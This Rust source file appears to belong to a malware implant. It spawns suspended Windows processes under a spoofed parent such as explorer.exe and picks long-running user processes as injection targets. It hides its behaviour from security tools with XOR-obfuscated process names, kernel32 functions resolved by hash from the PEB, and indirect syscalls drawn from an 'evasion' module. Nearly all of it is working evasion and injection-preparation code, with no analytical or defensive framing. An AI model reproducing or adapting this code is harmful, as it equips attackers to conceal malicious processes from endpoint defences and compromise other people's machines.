#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Threading::{
    // Types and constants only — no IAT function entries:
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    STARTUPINFOEXA, PROCESS_INFORMATION,
    EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED,
    PROCESS_CREATE_PROCESS, PROCESS_QUERY_INFORMATION,
    STARTUPINFOA, LPPROC_THREAD_ATTRIBUTE_LIST,
};
// Non-x64 fallback: import kernel32 process functions via IAT
#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
use windows_sys::Win32::System::Threading::{
    CreateProcessA, InitializeProcThreadAttributeList,
    UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
};

/// Resolve CreateProcessA and PROC_THREAD_ATTRIBUTE helpers from kernel32 by hash (x64 only).
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn k32_proc_fns() -> Option<(usize, usize, usize, usize)> {
    use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
    use crate::resolve::api_hash::h;
    let k32 = peb_get_module_base(h::DLL_K32);
    if k32.is_null() { return None; }
    let init = resolve_by_hash(k32, h::K32_INIT_PTA)? as usize;
    let upd  = resolve_by_hash(k32, h::K32_UPD_PTA)? as usize;
    let del  = resolve_by_hash(k32, h::K32_DEL_PTA)? as usize;
    let cpa  = resolve_by_hash(k32, h::K32_CREATE_PA)? as usize;
    Some((init, upd, del, cpa))
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

#[cfg(target_os = "windows")]
pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(isize, isize)> {
    let parent_pid = find_pid_by_name(parent_name)?;
    let mut oa: ObjectAttributes = unsafe { core::mem::zeroed() };
    oa.length = core::mem::size_of::<ObjectAttributes>() as u32;
    let mut cid: ClientId = unsafe { core::mem::zeroed() };
    cid.unique_process = parent_pid as usize;
    let mut h_parent: isize = 0;
    let (ssn_open, tramp_open) = {
        use crate::resolve::api_hash::h;
        crate::evasion::syscalls::get_ssn_h(h::NT_OPEN_PROC)?
    };
    let status = crate::evasion::syscalls::indirect_syscall(
        ssn_open, tramp_open,
        &mut h_parent as *mut isize as usize,
        (PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION) as usize,
        &oa as *const ObjectAttributes as usize,
        &cid as *const ClientId as usize,
        0, 0,
    );
    if status < 0 || h_parent == 0 { return None; }

    // Resolve kernel32 functions by hash (no IAT entry on x64)
    #[cfg(target_arch = "x86_64")]
    let (fn_init, fn_upd, fn_del, fn_cpa) = k32_proc_fns()?;
    type InitAttrFn = unsafe extern "system" fn(*mut core::ffi::c_void, u32, u32, *mut usize) -> i32;
    type UpdAttrFn  = unsafe extern "system" fn(*mut core::ffi::c_void, u32, usize, *const core::ffi::c_void, usize, *mut core::ffi::c_void, *const usize) -> i32;
    type DelAttrFn  = unsafe extern "system" fn(*mut core::ffi::c_void);
    type CpaFn      = unsafe extern "system" fn(*const u8, *mut u8, *const core::ffi::c_void, *const core::ffi::c_void, i32, u32, *const core::ffi::c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32;
    #[cfg(target_arch = "x86_64")]
    let (init_attr, upd_attr, del_attr, cpa): (InitAttrFn, UpdAttrFn, DelAttrFn, CpaFn) = (
        core::mem::transmute(fn_init), core::mem::transmute(fn_upd),
        core::mem::transmute(fn_del),  core::mem::transmute(fn_cpa),
    );
    #[cfg(not(target_arch = "x86_64"))]
    let (init_attr, upd_attr, del_attr, cpa): (InitAttrFn, UpdAttrFn, DelAttrFn, CpaFn) = (
        core::mem::transmute(InitializeProcThreadAttributeList as usize),
        core::mem::transmute(UpdateProcThreadAttribute as usize),
        core::mem::transmute(DeleteProcThreadAttributeList as usize),
        core::mem::transmute(CreateProcessA as usize),
    );

    let mut attr_size: usize = 0;
    init_attr(core::ptr::null_mut(), 1, 0, &mut attr_size);
    let mut attr_buf = vec![0u8; attr_size];
    init_attr(attr_buf.as_mut_ptr() as *mut core::ffi::c_void, 1, 0, &mut attr_size);

    upd_attr(
        attr_buf.as_mut_ptr() as *mut core::ffi::c_void, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
        &h_parent as *const _ as *const core::ffi::c_void,
        core::mem::size_of::<isize>(),
        core::ptr::null_mut(), core::ptr::null(),
    );

    let mut si: STARTUPINFOEXA = core::mem::zeroed();
    si.StartupInfo.cb = core::mem::size_of::<STARTUPINFOEXA>() as u32;
    si.lpAttributeList = attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

    let ok = cpa(
        core::ptr::null(), target_exe.as_ptr() as *mut u8,
        core::ptr::null(), core::ptr::null(),
        0, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        core::ptr::null(), core::ptr::null(),
        &si.StartupInfo as *const STARTUPINFOA, &mut pi,
    );

    del_attr(attr_buf.as_mut_ptr() as *mut core::ffi::c_void);
    if let Some((ssn_c, tramp_c)) = {
        use crate::resolve::api_hash::h;
        crate::evasion::syscalls::get_ssn_h(h::NT_CLOSE)
    } {
        crate::evasion::syscalls::indirect_syscall(ssn_c, tramp_c, h_parent as usize, 0, 0, 0, 0, 0);
    }

    if ok == 0 { return None; }
    Some((pi.hProcess, pi.hThread))
}

#[cfg(target_os = "windows")]
pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> {
    const K: u8 = 0x07;
    {
        let enc: [u8; 13] = [0x62,0x7F,0x77,0x6B,0x68,0x75,0x62,0x75,0x29,0x62,0x7F,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
    }
    {
        let enc: [u8; 18] = [0x55,0x72,0x69,0x73,0x6e,0x6a,0x62,0x45,0x75,0x68,0x6c,0x62,0x75,0x29,0x62,0x7f,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
    }
    {
        let enc: [u8; 11] = [0x74,0x6E,0x6F,0x68,0x74,0x73,0x29,0x62,0x7F,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
    }
    {
        let enc: [u8; 12] = [0x74,0x71,0x64,0x6F,0x68,0x74,0x73,0x29,0x62,0x7F,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
    }
    {
        let enc: [u8; 18] = [0x54,0x62,0x66,0x75,0x64,0x6f,0x4e,0x69,0x63,0x62,0x7f,0x62,0x75,0x29,0x62,0x7f,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
    }
    // Fallback plain CreateProcessA — still hash-resolved on x64
    #[cfg(target_arch = "x86_64")]
    let cpa_plain: unsafe extern "system" fn(*const u8, *mut u8, *const core::ffi::c_void, *const core::ffi::c_void, i32, u32, *const core::ffi::c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32 = {
        use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
        use crate::resolve::api_hash::h;
        let k32 = peb_get_module_base(h::DLL_K32);
        match resolve_by_hash(k32, h::K32_CREATE_PA) {
            Some(p) => core::mem::transmute(p),
            None    => return None,
        }
    };
    #[cfg(not(target_arch = "x86_64"))]
    let cpa_plain: unsafe extern "system" fn(*const u8, *mut u8, *const core::ffi::c_void, *const core::ffi::c_void, i32, u32, *const core::ffi::c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32 =
        core::mem::transmute(CreateProcessA as usize);
    let mut si: STARTUPINFOA = core::mem::zeroed();
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
    let ok = cpa_plain(
        core::ptr::null(), target_exe.as_ptr() as *mut u8,
        core::ptr::null(), core::ptr::null(),
        0, CREATE_SUSPENDED, core::ptr::null(), core::ptr::null(),
        &si, &mut pi,
    );
    if ok == 0 { return None; }
    Some((pi.hProcess, pi.hThread))
}

#[cfg(target_os = "windows")]
/// Find a suitable injection target from a priority list of common user-space processes.
/// Prefers long-running, non-critical processes that won't be killed during an operation.
pub unsafe fn find_injection_target() -> Option<u32> {
    const K: u8 = 0x07;
    {
        let enc: [u8; 13] = [0x62,0x7F,0x77,0x6B,0x68,0x75,0x62,0x75,0x29,0x62,0x7F,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
    }
    {
        let enc: [u8; 13] = [0x48,0x69,0x62,0x43,0x75,0x6e,0x71,0x62,0x29,0x62,0x7f,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
    }
    {
        let enc: [u8; 18] = [0x55,0x72,0x69,0x73,0x6e,0x6a,0x62,0x45,0x75,0x68,0x6c,0x62,0x75,0x29,0x62,0x7f,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
    }
    {
        let enc: [u8; 11] = [0x74,0x6E,0x6F,0x68,0x74,0x73,0x29,0x62,0x7F,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
    }
    {
        let enc: [u8; 14] = [0x54,0x62,0x66,0x75,0x64,0x6f,0x46,0x77,0x77,0x29,0x62,0x7f,0x62,0x07];
        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
    }
    None
}

/// Enumerate processes via NtQuerySystemInformation (class 5) — no ToolHelp IAT entries.
/// x64 offsets: ImageName.Length@0x38, ImageName.Buffer@0x40, UniqueProcessId@0x50.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
    use crate::resolve::api_hash::h;
    let Some((ssn, tramp)) = get_ssn_h(h::NT_QS_INFO) else { return None; };
    let mut needed = 0u32;
    let mut dummy = [0u8; 8];
    indirect_syscall(ssn, tramp, 5, dummy.as_mut_ptr() as usize, 8, &mut needed as *mut u32 as usize, 0, 0);
    let buf_size = (needed as usize + 0x1000) & !0xFFF;
    let mut buf = vec![0u8; buf_size];
    let st = indirect_syscall(ssn, tramp, 5, buf.as_mut_ptr() as usize, buf_size, &mut needed as *mut u32 as usize, 0, 0);
    if st < 0 { return None; }
    let target_len = name.iter().take_while(|&&b| b != 0).count();
    let target = &name[..target_len];
    let mut offset = 0usize;
    loop {
        let p = buf.as_ptr().add(offset);
        let next_off = u32::from_le_bytes([*p, *p.add(1), *p.add(2), *p.add(3)]) as usize;
        let name_len_bytes = u16::from_le_bytes([*p.add(0x38), *p.add(0x39)]) as usize;
        let name_len_chars = name_len_bytes / 2;
        let name_buf_addr = usize::from_le_bytes([
            *p.add(0x40), *p.add(0x41), *p.add(0x42), *p.add(0x43),
            *p.add(0x44), *p.add(0x45), *p.add(0x46), *p.add(0x47),
        ]);
        if name_len_chars > 0 && name_len_chars == target.len() && name_buf_addr != 0 {
            let wide = core::slice::from_raw_parts(name_buf_addr as *const u16, name_len_chars);
            if wide.iter().zip(target.iter()).all(|(&w, &a)| (w as u8).to_ascii_lowercase() == a.to_ascii_lowercase()) {
                let pid = usize::from_le_bytes([
                    *p.add(0x50), *p.add(0x51), *p.add(0x52), *p.add(0x53),
                    *p.add(0x54), *p.add(0x55), *p.add(0x56), *p.add(0x57),
                ]) as u32;
                return Some(pid);
            }
        }
        if next_off == 0 { break; }
        offset += next_off;
    }
    None
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32First, Process32Next,
        TH32CS_SNAPPROCESS, PROCESSENTRY32,
    };
    let nt_close_s = |h_val: isize| {
        use crate::resolve::api_hash::h;
        if let Some((sc, tc)) = crate::evasion::syscalls::get_ssn_h(h::NT_CLOSE) {
            crate::evasion::syscalls::indirect_syscall(sc, tc, h_val as usize, 0, 0, 0, 0, 0);
        }
    };
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == 0 { return None; }
    let mut entry: PROCESSENTRY32 = core::mem::zeroed();
    entry.dwSize = core::mem::size_of::<PROCESSENTRY32>() as u32;
    if Process32First(snap, &mut entry) == 0 { nt_close_s(snap); return None; }
    loop {
        let max_len = name.len().min(entry.szExeFile.len());
        let exe_slice = &entry.szExeFile[..max_len];
        if exe_slice.iter().zip(name.iter()).all(|(&a, &b)| a == b as u8) {
            nt_close_s(snap);
            return Some(entry.th32ProcessID);
        }
        if Process32Next(snap, &mut entry) == 0 { break; }
    }
    nt_close_s(snap);
    None
}
